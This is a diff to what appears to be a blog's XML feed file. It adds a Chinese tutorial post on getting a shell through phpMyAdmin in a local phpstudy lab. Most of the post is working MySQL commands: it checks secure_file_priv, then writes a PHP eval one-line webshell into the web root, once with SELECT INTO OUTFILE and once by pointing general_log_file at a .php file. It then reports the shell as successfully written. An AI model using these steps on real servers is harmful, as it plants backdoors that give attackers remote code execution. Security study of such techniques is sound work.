@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>phpmyadmin后台getshell</title>
+      <link href="/2022/05/24/phpmyadmin-webshell/"/>
+      <url>/2022/05/24/phpmyadmin-webshell/</url>
+      
+        <content type="html"><![CDATA[<h1 id="phpmyadmin后台getshell"><a href="#phpmyadmin后台getshell" class="headerlink" title="phpmyadmin后台getshell"></a>phpmyadmin后台getshell</h1><h2 id="select-into-outfile导出木马"><a href="#select-into-outfile导出木马" class="headerlink" title="select into outfile导出木马"></a>select into outfile导出木马</h2><blockquote><p>web目录写权限</p><p>知道网站绝对路径</p><p>secure_file_priv没有具体值</p></blockquote><p>通过命令查看路径</p><pre class=" language-mysql"><code class="language-mysql">select @@basedir;</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524200554126.png" alt="image-20220524200554126"></p><p>通过这个路径可以推断出web路径<code>C:\phpstudy_pro\www\</code></p><p>查看参数</p><pre class=" language-mysql"><code class="language-mysql">show global variables like '%secure%';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524200756560.png" alt="image-20220524200756560"></p><blockquote><p>当value为“null”时，不允许读取任意文件</p><p>当value为“空”时，允许读取任意文件</p><p>value也可设置为其他路径</p></blockquote><p>此时是<code>NULL</code>的情况下不能导出文件，需要在<code>my.ini</code>中加入<code>secure_file_priv =&quot;&quot;</code></p><p>最常用的是通过<code>into outfile</code>在网站根目录上直接写入一句话木马：</p><pre class=" language-mysql"><code class="language-mysql">select '<?php eval($_POST[cmd]); ?>' into outfile 'C:\phpstudy_pro\www\flag.php';</code></pre><h2 id="利用mysql日志"><a href="#利用mysql日志" class="headerlink" title="利用mysql日志"></a>利用mysql日志</h2><blockquote><p>Mysql 5.0版本以上会创建日志文件，通过修改日志的全局变量，也可以getshell。但是也要对生成的日志有可读可写的权限。</p></blockquote><p>需要两个全局变量<code>general_log</code>和<code>general_log file</code></p><blockquote><p><strong>general log</strong> 指的是日志保存状态，ON代表开启 OFF代表关闭；</p><p><strong>general log file</strong> 指的是日志的保存路径。</p></blockquote><p>查看日志状态</p><pre class=" language-mysql"><code class="language-mysql">show variables like '%general%';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524201434432.png" alt="image-20220524201434432"></p><p>修改<code>general_log</code>为<code>ON</code></p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log='on';</code></pre><p>将<code>general_log_file</code>的路径改成<code>C:/phpstudy_pro/www/flag.php</code></p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log_file='C:/phpstudy_pro/www/flag.php';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202147435.png" alt="image-20220524202147435"></p><p>可以写入一句话木马</p><pre class=" language-mysql"><code class="language-mysql">SELECT '<?php eval($_POST["cmd"]);?>'</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202315040.png" alt="image-20220524202315040"></p><p>访问<code>flag.php</code>看看</p><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202509908.png" alt="image-20220524202509908"></p><p>成功写入<code>webshell</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> phpmyadmin </tag>
+            
+            <tag> web </tag>
+            
+            <tag> sql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WebLogic XMLDecoder反序列化漏洞(CVE-2017-10217)</title>
       <link href="/2022/05/15/WebLogic-wls-xml/"/>
       <url>/2022/05/15/WebLogic-wls-xml/</url>
@@ -2449,9 +2480,9 @@
             
             <tag> web </tag>
             
-            <tag> sql注入 </tag>
-            
             <tag> sql </tag>
+            
+            <tag> sql注入 </tag>
             
         </tags>
       
